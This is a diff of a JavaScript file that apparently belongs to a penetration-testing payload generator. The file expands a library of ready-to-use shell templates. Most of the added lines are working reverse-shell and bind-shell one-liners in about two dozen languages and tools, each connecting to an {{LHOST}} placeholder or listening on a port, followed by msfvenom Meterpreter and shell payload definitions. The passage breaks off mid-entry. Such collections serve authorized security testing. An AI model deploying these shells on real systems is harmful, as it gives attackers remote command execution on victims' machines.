@@ -3967,242 +3967,587 @@ const TRANSFER_PROTOCOLS = [{
 ];
 
 const REVERSE_SHELL_TEMPLATES = {
-    bash: {
-        label: 'Bash',
-        attacker: 'nc -lvnp {{LPORT}}',
-        victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
-    },
-    python: {
-        label: 'Python',
-        attacker: 'nc -lvnp {{LPORT}}',
-        victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-    },
-    powershell: {
-        label: 'PowerShell',
-        attacker: 'nc -lvnp {{LPORT}}',
-        victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \' ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
-    },
-    netcat: {
-        label: 'Netcat (with -e)',
-        attacker: 'nc -lvnp {{LPORT}}',
-        victim: 'nc {{LHOST}} {{LPORT}} -e /bin/bash'
-    }
+  bash: {
+    label: 'Bash',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
+  },
+  bash_196: {
+    label: 'Bash 196',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: '0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; {{SHELL}} <&196 >&196 2>&196'
+  },
+  bash_5: {
+    label: 'Bash read line',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done'
+  },
+  python: {
+    label: 'Python',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{{SHELL}}\",\"-i\"])'"
+  },
+  python_short: {
+    label: 'Python (short)',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{{SHELL}}\")'"
+  },
+  python_ipv6: {
+    label: 'Python IPv6',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -6 -lvnp {{LPORT}}',
+    victim: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"{{SHELL}}\",\"-i\"])'"
+  },
+  powershell: {
+    label: 'PowerShell',
+    os: ['windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+  },
+  powershell_short: {
+    label: 'PowerShell (short)',
+    os: ['windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+  },
+  netcat: {
+    label: 'Netcat (with -e)',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'nc {{LHOST}} {{LPORT}} -e {{SHELL}}'
+  },
+  netcat_openbsd: {
+    label: 'Netcat OpenBSD',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{{SHELL}} -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f'
+  },
+  netcat_busybox: {
+    label: 'BusyBox nc',
+    os: ['linux'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'rm -f /tmp/p; mknod /tmp/p p && nc {{LHOST}} {{LPORT}} 0</tmp/p | {{SHELL}} 1>/tmp/p 2>&1'
+  },
+  perl: {
+    label: 'Perl',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'perl -e \'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{{SHELL}} -i");};\'',
+  },
+  perl_no_sh: {
+    label: 'Perl (no /bin/sh)',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{{LHOST}}:{{LPORT}}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
+  },
+  php: {
+    label: 'PHP',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'php -r \'$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("{{SHELL}} -i <&3 >&3 2>&3");\''
+  },
+  php_cmd: {
+    label: 'PHP cmd',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'php -r \'$sock=fsockopen("{{LHOST}}",{{LPORT}});shell_exec("{{SHELL}} -i <&3 >&3 2>&3");\''
+  },
+  ruby: {
+    label: 'Ruby',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'ruby -rsocket -e\'f=TCPSocket.open("{{LHOST}}",{{LPORT}}).to_i;exec sprintf("{{SHELL}} -i <&%d >&%d 2>&%d",f,f,f)\''
+  },
+  ruby_no_sh: {
+    label: 'Ruby (no /bin/sh)',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{{LHOST}}","{{LPORT}}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
+  },
+  golang: {
+    label: 'Golang',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{{LHOST}}:{{LPORT}}");cmd:=exec.Command("{{SHELL}}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
+  },
+  nodejs: {
+    label: 'Node.js',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("{{SHELL}}", []);var client = new net.Socket();client.connect({{LPORT}}, "{{LHOST}}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\''
+  },
+  java: {
+    label: 'Java',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done"});'
+  },
+  socat: {
+    label: 'Socat',
+    os: ['linux', 'mac'],
+    attacker: 'socat file:`tty`,raw,echo=0 tcp-listen:{{LPORT}}',
+    victim: 'socat exec:\'{{SHELL}} -li\',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}'
+  },
+  awk: {
+    label: 'Awk',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'awk \'BEGIN {s = "/inet/tcp/0/{{LHOST}}/{{LPORT}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'
+  },
+  telnet: {
+    label: 'Telnet',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'TF=$(mktemp -u);mkfifo $TF && telnet {{LHOST}} {{LPORT}} 0<$TF | {{SHELL}} 1>$TF'
+  },
+  openssl: {
+    label: 'OpenSSL',
+    os: ['linux', 'mac'],
+    attacker: 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port {{LPORT}}',
+    victim: 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{LHOST}}:{{LPORT}} > /tmp/s; rm /tmp/s'
+  },
+  lua: {
+    label: 'Lua',
+    os: ['linux', 'mac'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{{LHOST}}\',\'{{LPORT}}\');os.execute(\'{{SHELL}} -i <&3 >&3 2>&3\');"'
+  },
+  groovy: {
+    label: 'Groovy',
+    os: ['linux', 'mac', 'windows'],
+    attacker: 'nc -lvnp {{LPORT}}',
+    victim: 'groovy -e \'String host="{{LHOST}}";int port={{LPORT}};String cmd="{{SHELL}}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\''
+  }
+};
+
+const BIND_SHELL_TEMPLATES = {
+  bash: {
+    label: 'Bash',
+    os: ['linux', 'mac'],
+    victim: 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | {{SHELL}} -i 2>&1 | nc -l {{LPORT}} > /tmp/f',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  python: {
+    label: 'Python',
+    os: ['linux', 'mac', 'windows'],
+    victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{{LPORT}}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"{{SHELL}}\",\"-i\"])'",
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  python_ipv6: {
+    label: 'Python IPv6',
+    os: ['linux', 'mac', 'windows'],
+    victim: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6);s.bind((\"::\",{{LPORT}}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"{{SHELL}}\",\"-i\"])'",
+    attacker: 'nc -6 {{RHOST}} {{LPORT}}'
+  },
+  powershell: {
+    label: 'PowerShell',
+    os: ['windows'],
+    victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$listener = [System.Net.Sockets.TcpListener]{{LPORT}};$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  netcat: {
+    label: 'Netcat (with -e)',
+    os: ['linux', 'mac'],
+    victim: 'nc -l -p {{LPORT}} -e {{SHELL}}',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  netcat_openbsd: {
+    label: 'Netcat OpenBSD',
+    os: ['linux', 'mac'],
+    victim: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{{SHELL}} -i 2>&1|nc -l {{LPORT}} >/tmp/f',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  perl: {
+    label: 'Perl',
+    os: ['linux', 'mac', 'windows'],
+    victim: 'perl -e \'use Socket;$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{{SHELL}} -i");\'',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  php: {
+    label: 'PHP',
+    os: ['linux', 'mac', 'windows'],
+    victim: 'php -r \'$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",{{LPORT}});socket_listen($sock,1);$client=socket_accept($sock);exec("{{SHELL}} -i <&3 >&3 2>&3");\'',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  ruby: {
+    label: 'Ruby',
+    os: ['linux', 'mac', 'windows'],
+    victim: 'ruby -rsocket -e\'s=TCPServer.new({{LPORT}});c=s.accept;f=c.to_i;exec sprintf("{{SHELL}} -i <&%d >&%d 2>&%d",f,f,f)\'',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  nodejs: {
+    label: 'Node.js',
+    os: ['linux', 'mac', 'windows'],
+    victim: 'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("{{SHELL}}", []);var server = net.createServer(function(client){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});server.listen({{LPORT}});})();\' &',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  socat: {
+    label: 'Socat',
+    os: ['linux', 'mac'],
+    victim: 'socat TCP-LISTEN:{{LPORT}},reuseaddr,fork EXEC:{{SHELL}},pty,stderr,setsid,sigint,sane',
+    attacker: 'socat FILE:`tty`,raw,echo=0 TCP:{{RHOST}}:{{LPORT}}'
+  },
+  socat_tty: {
+    label: 'Socat TTY',
+    os: ['linux', 'mac'],
+    victim: 'socat TCP-LISTEN:{{LPORT}},reuseaddr,fork EXEC:"{{SHELL}} -li",pty,stderr,setsid,sigint,sane',
+    attacker: 'socat FILE:`tty`,raw,echo=0 TCP:{{RHOST}}:{{LPORT}}'
+  },
+  awk: {
+    label: 'Awk',
+    os: ['linux', 'mac'],
+    victim: 'awk \'BEGIN {s = "/inet/tcp/{{LPORT}}/0/0"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null &',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  lua: {
+    label: 'Lua',
+    os: ['linux', 'mac'],
+    victim: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:bind(\'0.0.0.0\',{{LPORT}});t:listen(1);c=t:accept();os.execute(\'{{SHELL}} -i <&3 >&3 2>&3\');"',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
+  java: {
+    label: 'Java',
+    os: ['linux', 'mac', 'windows'],
+    victim: 'java -c \'ServerSocket ss = new ServerSocket({{LPORT}}); Socket s = ss.accept(); Process p = new ProcessBuilder("{{SHELL}}").redirectErrorStream(true).start(); InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){} }; p.destroy(); s.close(); ss.close();\'',
+    attacker: 'nc {{RHOST}} {{LPORT}}'
+  },
 };
 
 const MSFVENOM_TEMPLATES = [
-    // Windows Payloads
-    {
-        key: 'windows_meterpreter',
-        label: 'Windows x64 Meterpreter (exe)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'exe',
-        extension: 'exe',
-        defaultName: 'payload'
-    },
-    {
-        key: 'windows_meterpreter_https',
-        label: 'Windows x64 Meterpreter HTTPS (exe)',
-        payload: 'windows/x64/meterpreter/reverse_https',
-        format: 'exe',
-        extension: 'exe',
-        defaultName: 'payload'
-    },
-    {
-        key: 'windows_shell',
-        label: 'Windows x64 Shell (exe)',
-        payload: 'windows/x64/shell_reverse_tcp',
-        format: 'exe',
-        extension: 'exe',
-        defaultName: 'payload'
-    },
-    {
-        key: 'windows_x86_meterpreter',
-        label: 'Windows x86 Meterpreter (exe)',
-        payload: 'windows/meterpreter/reverse_tcp',
-        format: 'exe',
-        extension: 'exe',
-        defaultName: 'payload'
-    },
-    {
-        key: 'windows_powershell',
-        label: 'Windows PowerShell (cmd)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'psh-cmd',
-        extension: 'bat',
-        defaultName: 'payload'
-    },
-    {
-        key: 'windows_dll',
-        label: 'Windows x64 Meterpreter (dll)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'dll',
-        extension: 'dll',
-        defaultName: 'payload'
-    },
+  // =========================
+  // Windows – Reverse shells
+  // =========================
+  {
+    key: 'windows_meterpreter',
+    label: 'Windows x64 Meterpreter (exe)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_meterpreter_https',
+    label: 'Windows x64 Meterpreter HTTPS (exe)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_https',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_shell',
+    label: 'Windows x64 Shell (exe)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/shell_reverse_tcp',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_x86_meterpreter',
+    label: 'Windows x86 Meterpreter (exe)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/meterpreter/reverse_tcp',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_powershell',
+    label: 'Windows PowerShell Meterpreter (cmd)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'psh-cmd',
+    extension: 'bat',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_dll',
+    label: 'Windows x64 Meterpreter (dll)',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/x64/meterpreter/reverse_tcp',
+    format: 'dll',
+    extension: 'dll',
+    defaultName: 'payload'
+  },
 
-    // Linux Payloads
-    {
-        key: 'linux_x64',
-        label: 'Linux x64 Shell (elf)',
-        payload: 'linux/x64/shell_reverse_tcp',
-        format: 'elf',
-        extension: 'elf',
-        defaultName: 'payload'
-    },
-    {
-        key: 'linux_x86',
-        label: 'Linux x86 Shell (elf)',
-        payload: 'linux/x86/shell_reverse_tcp',
-        format: 'elf',
-        extension: 'elf',
-        defaultName: 'payload'
-    },
-    {
-        key: 'linux_x64_meterpreter',
-        label: 'Linux x64 Meterpreter (elf)',
-        payload: 'linux/x64/meterpreter/reverse_tcp',
-        format: 'elf',
-        extension: 'elf',
-        defaultName: 'payload'
-    },
-    {
-        key: 'linux_armle',
-        label: 'Linux ARM Shell (elf)',
-        payload: 'linux/armle/shell_reverse_tcp',
-        format: 'elf',
-        extension: 'elf',
-        defaultName: 'payload'
-    },
+  // =========================
+  // Windows – Bind shells
+  // =========================
+  {
+    key: 'windows_bind_shell',
+    label: 'Windows x64 Shell Bind TCP (exe)',
+    os: ['windows'],
+    type: 'bind',
+    payload: 'windows/x64/shell_bind_tcp',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
+  {
+    key: 'windows_bind_meterpreter',
+    label: 'Windows x64 Meterpreter Bind TCP (exe)',
+    os: ['windows'],
+    type: 'bind',
+    payload: 'windows/x64/meterpreter/bind_tcp',
+    format: 'exe',
+    extension: 'exe',
+    defaultName: 'payload'
+  },
 
-    // macOS Payloads
-    {
-        key: 'macos',
-        label: 'macOS x64 Shell (macho)',
-        payload: 'osx/x64/shell_reverse_tcp',
-        format: 'macho',
-        extension: 'macho',
-        defaultName: 'payload'
-    },
-    {
-        key: 'macos_meterpreter',
-        label: 'macOS x64 Meterpreter (macho)',
-        payload: 'osx/x64/meterpreter/reverse_tcp',
-        format: 'macho',
-        extension: 'macho',
-        defaultName: 'payload'
-    },
+  // =========================
+  // Linux – Reverse shells
+  // =========================
+  {
+    key: 'linux_x64',
+    label: 'Linux x64 Shell (elf)',
+    os: ['linux'],
+    type: 'reverse',
+    payload: 'linux/x64/shell_reverse_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
+  {
+    key: 'linux_x86',
+    label: 'Linux x86 Shell (elf)',
+    os: ['linux'],
+    type: 'reverse',
+    payload: 'linux/x86/shell_reverse_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
+  {
+    key: 'linux_x64_meterpreter',
+    label: 'Linux x64 Meterpreter (elf)',
+    os: ['linux'],
+    type: 'reverse',
+    payload: 'linux/x64/meterpreter/reverse_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
+  {
+    key: 'linux_armle',
+    label: 'Linux ARMLE Shell (elf)',
+    os: ['linux'],
+    type: 'reverse',
+    payload: 'linux/armle/shell_reverse_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
 
-    // Web Payloads
-    {
-        key: 'php',
-        label: 'PHP Reverse TCP (raw)',
-        payload: 'php/reverse_php',
-        format: 'raw',
-        extension: 'php',
-        defaultName: 'payload'
-    },
-    {
-        key: 'php_meterpreter',
-        label: 'PHP Meterpreter (raw)',
-        payload: 'php/meterpreter/reverse_tcp',
-        format: 'raw',
-        extension: 'php',
-        defaultName: 'payload'
-    },
-    {
-        key: 'jsp',
-        label: 'JSP Shell (raw)',
-        payload: 'java/jsp_shell_reverse_tcp',
-        format: 'raw',
-        extension: 'jsp',
-        defaultName: 'payload'
-    },
-    {
-        key: 'asp',
-        label: 'ASP Shell (asp)',
-        payload: 'windows/shell/reverse_tcp',
-        format: 'asp',
-        extension: 'asp',
-        defaultName: 'payload'
-    },
-    {
-        key: 'aspx',
-        label: 'ASPX Shell (aspx)',
-        payload: 'windows/shell/reverse_tcp',
-        format: 'aspx',
-        extension: 'aspx',
-        defaultName: 'payload'
-    },
-    {
-        key: 'python',
-        label: 'Python Shell (raw)',
-        payload: 'python/shell_reverse_tcp',
-        format: 'raw',
-        extension: 'py',
-        defaultName: 'payload'
-    },
-    {
-        key: 'nodejs',
-        label: 'Node.js Shell (raw)',
-        payload: 'nodejs/shell_reverse_tcp',
-        format: 'raw',
-        extension: 'js',
-        defaultName: 'payload'
-    },
+  // =========================
+  // Linux – Bind shells
+  // =========================
+  {
+    key: 'linux_bind_shell_x64',
+    label: 'Linux x64 Shell Bind TCP (elf)',
+    os: ['linux'],
+    type: 'bind',
+    payload: 'linux/x64/shell_bind_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
+  {
+    key: 'linux_bind_meterpreter_x64',
+    label: 'Linux x64 Meterpreter Bind TCP (elf)',
+    os: ['linux'],
+    type: 'bind',
+    payload: 'linux/x64/meterpreter/bind_tcp',
+    format: 'elf',
+    extension: 'elf',
+    defaultName: 'payload'
+  },
 
-    // Android
-    {
-        key: 'android',
-        label: 'Android Meterpreter (apk)',
-        payload: 'android/meterpreter/reverse_tcp',
-        format: 'apk',
-        extension: 'apk',
-        defaultName: 'payload'
-    },
+  // =========================
+  // macOS – Reverse shells
+  // =========================
+  {
+    key: 'macos',
+    label: 'macOS x64 Shell (macho)',
+    os: ['mac'],
+    type: 'reverse',
+    payload: 'osx/x64/shell_reverse_tcp',
+    format: 'macho',
+    extension: 'macho',
+    defaultName: 'payload'
+  },
+  {
+    key: 'macos_meterpreter',
+    label: 'macOS x64 Meterpreter (macho)',
+    os: ['mac'],
+    type: 'reverse',
+    payload: 'osx/x64/meterpreter/reverse_tcp',
+    format: 'macho',
+    extension: 'macho',
+    defaultName: 'payload'
+  },
 
-    // Java
-    {
-        key: 'java_jar',
-        label: 'Java Shell (jar)',
-        payload: 'java/shell_reverse_tcp',
-        format: 'jar',
-        extension: 'jar',
-        defaultName: 'payload'
-    },
-    {
-        key: 'java_war',
-        label: 'Java Shell (war)',
-        payload: 'java/shell_reverse_tcp',
-        format: 'war',
-        extension: 'war',
-        defaultName: 'payload'
-    },
+  // =========================
+  // Web – Reverse shells
+  // =========================
+  {
+    key: 'php',
+    label: 'PHP Reverse TCP (raw)',
+    os: ['linux', 'windows', 'mac'],
+    type: 'reverse',
+    payload: 'php/reverse_php',
+    format: 'raw',
+    extension: 'php',
+    defaultName: 'payload'
+  },
+  {
+    key: 'php_meterpreter',
+    label: 'PHP Meterpreter (raw)',
+    os: ['linux', 'windows', 'mac'],
+    type: 'reverse',
+    payload: 'php/meterpreter/reverse_tcp',
+    format: 'raw',
+    extension: 'php',
+    defaultName: 'payload'
+  },
+  {
+    key: 'jsp',
+    label: 'JSP Reverse Shell (raw)',
+    os: ['linux', 'windows'],
+    type: 'reverse',
+    payload: 'java/jsp_shell_reverse_tcp',
+    format: 'raw',
+    extension: 'jsp',
+    defaultName: 'payload'
+  },
+  {
+    key: 'asp',
+    label: 'ASP Reverse Shell',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/shell/reverse_tcp',
+    format: 'asp',
+    extension: 'asp',
+    defaultName: 'payload'
+  },
+  {
+    key: 'aspx',
+    label: 'ASPX Reverse Shell',
+    os: ['windows'],
+    type: 'reverse',
+    payload: 'windows/shell/reverse_tcp',
+    format: 'aspx',
+    extension: 'aspx',
+    defaultName: 'payload'
+  },
 
-    // Shellcode formats
-    {
-        key: 'shellcode_c',
-        label: 'Shellcode (C format)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'c',
-        extension: 'c',
-        defaultName: 'shellcode'
-    },
-    {
-        key: 'shellcode_python',
-        label: 'Shellcode (Python format)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'python',
-        extension: 'py',
-        defaultName: 'shellcode'
-    },
-    {
-        key: 'shellcode_raw',
-        label: 'Shellcode (Raw)',
-        payload: 'windows/x64/meterpreter/reverse_tcp',
-        format: 'raw',
-        extension: 'bin',
-        defaultName: 'shellcode'
-    }
+  // =========================
+  // Scripting – Reverse shells
+  // =========================
+  {
+    key: 'python',
+    label: 'Python Reverse Shell (raw)',
+    os: ['linux', 'windows', 'mac'],
+    type: 'reverse',
+    payload: 'python/shell_reverse_tcp',
+    format: 'raw',
+    extension: 'py',
+    defaultName: 'payload'
+  },
+  {
+    key: 'nodejs',
+    label: 'Node.js Reverse Shell (raw)',
+    os: ['linux', 'windows', 'mac'],
+    type: 'reverse',
+    payload: 'nodejs/shell_reverse_tcp',
+    format: 'raw',
+    extension: 'js',
+    defaultName: 'payload'
+  },
+
+  // =========================
+  // Android
+  // =========================
+  {
+    key: 'android',
+    label: 'Android Meterpreter (apk)',
+    os: ['android'],
+    type: 'reverse',
+    payload: 'android/meterpreter/reverse_tcp',
+    format: 'apk',
+    extension: 'apk',
+    defaultName: 'payload'
+  },
+
+  // =========================
+  // Java
+  // =========================
+  {
+    key: 'java_jar',
+    label: 'Java Reverse Shell (jar)',
+    os: ['linux', 'windows', 'mac'],
+    type: 'reverse',
+    payload: 'java/shell_reverse_tcp',
+    format: 'jar',
+    extension: 'jar',
+    defaultName: 'payload'
+  },
+  {
+    key: 'java_war',
+    label: 'Java Reverse Shell (war)',
+    os: ['linux', 'windows'],
+    type: 'reverse',
